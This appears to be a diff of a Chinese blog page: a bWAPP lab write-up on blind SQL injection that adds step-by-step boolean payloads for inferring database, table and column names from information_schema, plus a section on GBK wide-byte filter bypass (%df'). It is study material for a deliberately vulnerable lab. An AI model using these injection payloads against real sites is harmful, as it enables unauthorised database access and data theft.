@@ -6,21 +6,27 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="HandheldFriendly" content="True">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
-    <meta name="description" content="盲注baselow   mid&#x2F;high宽字节注入注入原理注入原理很简单, 就是编码, 一点一点分析: 假设一个url有注入, 但是有安全函数, 我们敲单引号会被过滤，那么怎么办呢？这时候就利用GBK双字节注入 我们在后边这么构造url一个尝试: 1http:&#x2F;&#x2F;www.****.com&#x2F;index.php?id&#x3D;1%df&#39; and 1&#x3D;1">
+    <meta name="description" content="盲注基本流程1.判断注入点123&#39;&#39; or 1&#x3D;1#&#39; or 1&#x3D;2#     2.判断数据库长度并逐个爆破(count&#x2F;length&#x2F;mid) 使用length()函数判断数据库长度（二分法）  1234-- 前面放回false 执行or 后面的语句如果返回true则数据库长度大于该值，反之小于&#39; or length(database()) &gt;  8#&#39; or length(databas">
 <meta property="og:type" content="article">
 <meta property="og:title" content="bWAPP-SQLiBlind">
 <meta property="og:url" content="http://yoursite.com/2020/09/22/bWAPP-SQLiBlind/index.html">
 <meta property="og:site_name" content="Tansz">
-<meta property="og:description" content="盲注baselow   mid&#x2F;high宽字节注入注入原理注入原理很简单, 就是编码, 一点一点分析: 假设一个url有注入, 但是有安全函数, 我们敲单引号会被过滤，那么怎么办呢？这时候就利用GBK双字节注入 我们在后边这么构造url一个尝试: 1http:&#x2F;&#x2F;www.****.com&#x2F;index.php?id&#x3D;1%df&#39; and 1&#x3D;1">
+<meta property="og:description" content="盲注基本流程1.判断注入点123&#39;&#39; or 1&#x3D;1#&#39; or 1&#x3D;2#     2.判断数据库长度并逐个爆破(count&#x2F;length&#x2F;mid) 使用length()函数判断数据库长度（二分法）  1234-- 前面放回false 执行or 后面的语句如果返回true则数据库长度大于该值，反之小于&#39; or length(database()) &gt;  8#&#39; or length(databas">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://yoursite.com/2020/09/22/bWAPP-SQLiBlind/image-20200922202427091.png">
-<meta property="og:image" content="http://yoursite.com/2020/09/22/bWAPP-SQLiBlind/image-20200922202435555.png">
-<meta property="og:image" content="http://yoursite.com/2020/09/22/bWAPP-SQLiBlind/image-20200922202448731.png">
+<meta property="og:image" content="http://yoursite.com/2020/09/22/bWAPP-SQLiBlind/image-20200922204246265.png">
+<meta property="og:image" content="http://yoursite.com/2020/09/22/bWAPP-SQLiBlind/image-20200922204329452.png">
+<meta property="og:image" content="http://yoursite.com/2020/09/22/bWAPP-SQLiBlind/image-20200922204338283.png">
+<meta property="og:image" content="http://yoursite.com/2020/09/22/bWAPP-SQLiBlind/image-20200922204457549.png">
+<meta property="og:image" content="http://yoursite.com/2020/09/22/bWAPP-SQLiBlind/image-20200922204522341.png">
+<meta property="og:image" content="http://yoursite.com/2020/09/22/bWAPP-SQLiBlind/image-20200922204636118.png">
+<meta property="og:image" content="http://yoursite.com/2020/09/22/bWAPP-SQLiBlind/image-20200922204814865.png">
+<meta property="og:image" content="http://yoursite.com/2020/09/22/bWAPP-SQLiBlind/image-20200922205443795.png">
+<meta property="og:image" content="http://yoursite.com/2020/09/22/bWAPP-SQLiBlind/image-20200922205754286.png">
 <meta property="article:published_time" content="2020-09-22T12:22:57.023Z">
-<meta property="article:modified_time" content="2020-09-22T12:37:19.794Z">
+<meta property="article:modified_time" content="2020-09-22T13:20:35.824Z">
 <meta property="article:author" content="Tansz">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://yoursite.com/2020/09/22/bWAPP-SQLiBlind/image-20200922202427091.png">
+<meta name="twitter:image" content="http://yoursite.com/2020/09/22/bWAPP-SQLiBlind/image-20200922204246265.png">
     
     
         
@@ -109,7 +115,7 @@
 
     </div>
     <div id="toc">
-      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#盲注"><span class="toc-number">1.</span> <span class="toc-text">盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#base"><span class="toc-number">1.1.</span> <span class="toc-text">base</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#low"><span class="toc-number">1.1.1.</span> <span class="toc-text">low</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mid-high"><span class="toc-number">1.1.2.</span> <span class="toc-text">mid&#x2F;high</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#宽字节注入"><span class="toc-number">2.</span> <span class="toc-text">宽字节注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#注入原理"><span class="toc-number">2.1.</span> <span class="toc-text">注入原理</span></a></li></ol></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#盲注"><span class="toc-number">1.</span> <span class="toc-text">盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#基本流程"><span class="toc-number">1.1.</span> <span class="toc-text">基本流程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-判断注入点"><span class="toc-number">1.1.1.</span> <span class="toc-text">1.判断注入点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-判断数据库长度并逐个爆破-count-length-mid"><span class="toc-number">1.1.2.</span> <span class="toc-text">2.判断数据库长度并逐个爆破(count&#x2F;length&#x2F;mid)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#爆破表的个数-长度-表名-count-length-mid"><span class="toc-number">1.1.3.</span> <span class="toc-text">爆破表的个数&#x2F;长度&#x2F;表名(count&#x2F;length&#x2F;mid)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#爆破列个数-长度-列名-count-length-mid"><span class="toc-number">1.1.4.</span> <span class="toc-text">爆破列个数&#x2F;长度&#x2F;列名(count&#x2F;length&#x2F;mid)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#base"><span class="toc-number">1.2.</span> <span class="toc-text">base</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#low"><span class="toc-number">1.2.1.</span> <span class="toc-text">low</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mid-high"><span class="toc-number">1.2.2.</span> <span class="toc-text">mid&#x2F;high</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#宽字节注入"><span class="toc-number">2.</span> <span class="toc-text">宽字节注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#注入原理"><span class="toc-number">2.1.</span> <span class="toc-text">注入原理</span></a></li></ol></li></ol>
     </div>
   </span>
 </div>
@@ -148,10 +154,71 @@
   
 
   <div class="content" itemprop="articleBody">
-    <h1 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h1><h2 id="base"><a href="#base" class="headerlink" title="base"></a>base</h2><h3 id="low"><a href="#low" class="headerlink" title="low"></a>low</h3><p><img src="/2020/09/22/bWAPP-SQLiBlind/image-20200922202427091.png" alt="image-20200922202427091"></p>
-<p><img src="/2020/09/22/bWAPP-SQLiBlind/image-20200922202435555.png" alt="image-20200922202435555"></p>
-<p><img src="/2020/09/22/bWAPP-SQLiBlind/image-20200922202448731.png" alt="image-20200922202448731"></p>
-<h3 id="mid-high"><a href="#mid-high" class="headerlink" title="mid/high"></a>mid/high</h3><h1 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h1><h2 id="注入原理"><a href="#注入原理" class="headerlink" title="注入原理"></a>注入原理</h2><p>注入原理很简单, 就是编码, 一点一点分析:</p>
+    <h1 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h1><h2 id="基本流程"><a href="#基本流程" class="headerlink" title="基本流程"></a>基本流程</h2><h3 id="1-判断注入点"><a href="#1-判断注入点" class="headerlink" title="1.判断注入点"></a>1.判断注入点</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">'</span><br><span class="line">' or 1=1<span class="comment">#</span></span><br><span class="line">' or 1=2<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/09/22/bWAPP-SQLiBlind/image-20200922204246265.png" alt="image-20200922204246265"></p>
+<p><img src="/2020/09/22/bWAPP-SQLiBlind/image-20200922204329452.png" alt="image-20200922204329452"></p>
+<p><img src="/2020/09/22/bWAPP-SQLiBlind/image-20200922204338283.png" alt="image-20200922204338283"></p>
+<h3 id="2-判断数据库长度并逐个爆破-count-length-mid"><a href="#2-判断数据库长度并逐个爆破-count-length-mid" class="headerlink" title="2.判断数据库长度并逐个爆破(count/length/mid)"></a>2.判断数据库长度并逐个爆破(count/length/mid)</h3><ul>
+<li>使用length()函数判断数据库长度（二分法）</li>
+</ul>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 前面放回false 执行or 后面的语句如果返回true则数据库长度大于该值，反之小于</span></span><br><span class="line">' or length(database()) &gt;  8#</span><br><span class="line">' or length(database()) &gt;  4#</span><br><span class="line">' or length(database()) &gt;  6#</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/09/22/bWAPP-SQLiBlind/image-20200922204457549.png" alt="image-20200922204457549"></p>
+<p><img src="/2020/09/22/bWAPP-SQLiBlind/image-20200922204522341.png" alt="image-20200922204522341"></p>
+<p><img src="/2020/09/22/bWAPP-SQLiBlind/image-20200922204636118.png" alt="image-20200922204636118"></p>
+<p>故数据库长度为5</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' or length(database()) =  5<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/09/22/bWAPP-SQLiBlind/image-20200922204814865.png" alt="image-20200922204814865"></p>
+<ul>
+<li><p>逐个字符爆破数据库名</p>
+<p>使用<code>mid</code>或<code>substring</code>截取字符并逐个判断</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--' or ascii(mid(database(),1,1))&gt;110 #</span></span><br><span class="line">' or ascii(substring(database(),1,1))&gt;100 # （false）</span><br><span class="line">' or ascii(substring(database(),1,1))&gt;95 # (true)</span><br><span class="line">' or ascii(substring(database(),1,1))&gt;97 # (true)</span><br><span class="line">' or ascii(substring(database(),1,1))&gt;99 # (flase)</span><br><span class="line">' or ascii(substring(database(),1,1))= 98 <span class="comment"># (true)</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/09/22/bWAPP-SQLiBlind/image-20200922205443795.png" alt="image-20200922205443795"></p>
+<p>98对应为字符 b </p>
+<p><a href="https://tool.ip138.com/ascii_code/" target="_blank" rel="noopener">ascii码对照</a></p>
+<p><img src="/2020/09/22/bWAPP-SQLiBlind/image-20200922205754286.png" alt="image-20200922205754286"></p>
+<p>以此类推得到表名</p>
+</li>
+</ul>
+<h3 id="爆破表的个数-长度-表名-count-length-mid"><a href="#爆破表的个数-长度-表名-count-length-mid" class="headerlink" title="爆破表的个数/长度/表名(count/length/mid)"></a>爆破表的个数/长度/表名(count/length/mid)</h3><ul>
+<li>爆破表的个数</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">’ or (<span class="keyword">select</span> <span class="keyword">count</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>())&gt;<span class="number">5</span> <span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>爆破表的长度</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' or length((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>)) &gt; <span class="number">5</span> <span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>爆破字符</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' or ascii(mid((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)) &gt; <span class="number">100</span> <span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="爆破列个数-长度-列名-count-length-mid"><a href="#爆破列个数-长度-列名-count-length-mid" class="headerlink" title="爆破列个数/长度/列名(count/length/mid)"></a>爆破列个数/长度/列名(count/length/mid)</h3><ul>
+<li>爆破列的个数</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' or (<span class="keyword">select</span> <span class="keyword">count</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">and</span> table_name=<span class="string">'users'</span>) &gt; <span class="number">5</span> <span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>爆破列的长度</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">' or length((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> </span><br><span class="line"> table_schema=<span class="keyword">database</span>() <span class="keyword">and</span> table_name=<span class="string">'users'</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>)) &gt; <span class="number">5</span> <span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>爆破列名</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">' or ascii(mid((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> </span><br><span class="line"> table_schema=<span class="keyword">database</span>() <span class="keyword">and</span> table_name=<span class="string">'users'</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)) &gt; <span class="number">105</span> <span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="base"><a href="#base" class="headerlink" title="base"></a>base</h2><h3 id="low"><a href="#low" class="headerlink" title="low"></a>low</h3><p>直接注入，可使用sqlmap进行注入</p>
+<h3 id="mid-high"><a href="#mid-high" class="headerlink" title="mid/high"></a>mid/high</h3><p>采用了addslashed()和mysqli_real_escape_string()函数, </p>
+<p>且mysql编码和os编码一致, 无法用宽字节绕过,</p>
+<h1 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h1><h2 id="注入原理"><a href="#注入原理" class="headerlink" title="注入原理"></a>注入原理</h2><p>注入原理很简单, 就是编码, 一点一点分析:</p>
 <p>假设一个url有注入, 但是有安全函数, 我们敲单引号会被过滤，那么怎么办呢？这时候就利用GBK双字节注入</p>
 <p>我们在后边这么构造url一个尝试:</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.****.com&#x2F;index.php?id&#x3D;1%df&#39; and 1&#x3D;1</span><br></pre></td></tr></table></figure>
@@ -194,7 +261,7 @@
     </div>
 
     <div id="toc-footer" style="display: none">
-      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#盲注"><span class="toc-number">1.</span> <span class="toc-text">盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#base"><span class="toc-number">1.1.</span> <span class="toc-text">base</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#low"><span class="toc-number">1.1.1.</span> <span class="toc-text">low</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mid-high"><span class="toc-number">1.1.2.</span> <span class="toc-text">mid&#x2F;high</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#宽字节注入"><span class="toc-number">2.</span> <span class="toc-text">宽字节注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#注入原理"><span class="toc-number">2.1.</span> <span class="toc-text">注入原理</span></a></li></ol></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#盲注"><span class="toc-number">1.</span> <span class="toc-text">盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#基本流程"><span class="toc-number">1.1.</span> <span class="toc-text">基本流程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-判断注入点"><span class="toc-number">1.1.1.</span> <span class="toc-text">1.判断注入点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-判断数据库长度并逐个爆破-count-length-mid"><span class="toc-number">1.1.2.</span> <span class="toc-text">2.判断数据库长度并逐个爆破(count&#x2F;length&#x2F;mid)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#爆破表的个数-长度-表名-count-length-mid"><span class="toc-number">1.1.3.</span> <span class="toc-text">爆破表的个数&#x2F;长度&#x2F;表名(count&#x2F;length&#x2F;mid)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#爆破列个数-长度-列名-count-length-mid"><span class="toc-number">1.1.4.</span> <span class="toc-text">爆破列个数&#x2F;长度&#x2F;列名(count&#x2F;length&#x2F;mid)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#base"><span class="toc-number">1.2.</span> <span class="toc-text">base</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#low"><span class="toc-number">1.2.1.</span> <span class="toc-text">low</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mid-high"><span class="toc-number">1.2.2.</span> <span class="toc-text">mid&#x2F;high</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#宽字节注入"><span class="toc-number">2.</span> <span class="toc-text">宽字节注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#注入原理"><span class="toc-number">2.1.</span> <span class="toc-text">注入原理</span></a></li></ol></li></ol>
     </div>
 
     <div id="share-footer" style="display: none">
